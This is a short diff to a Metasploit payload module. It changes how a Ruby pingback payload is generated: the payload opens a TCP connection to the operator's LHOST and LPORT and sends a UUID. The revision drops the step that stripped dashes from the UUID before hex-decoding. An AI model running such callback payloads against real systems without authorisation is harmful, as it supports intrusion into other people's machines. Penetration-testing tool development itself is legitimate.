@@ -33,14 +33,15 @@ module MetasploitModule
   end
 
   def ruby_string
-    self.pingback_uuid ||= generate_pingback_uuid
-
+    self.pingback_uuid ||= self.generate_pingback_uuid
     lhost = datastore['LHOST']
     lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
 
-    return "require 'socket';" \
-      "c=TCPSocket.new(\"#{lhost}\", #{datastore['LPORT'].to_i});" \
-      "c.puts(\'#{self.pingback_uuid.gsub('-', '')}\'.scan(/../).map { |x| x.hex.chr }.join);" \
-      "c.close"
+    ruby_code = <<~RUBY
+      require 'socket';
+      c=TCPSocket.new("#{lhost}", #{datastore['LPORT'].to_i});
+      c.puts('#{self.pingback_uuid}'.scan(/../).map { |x| x.hex.chr }.join);
+      c.close;
+    RUBY
   end
 end
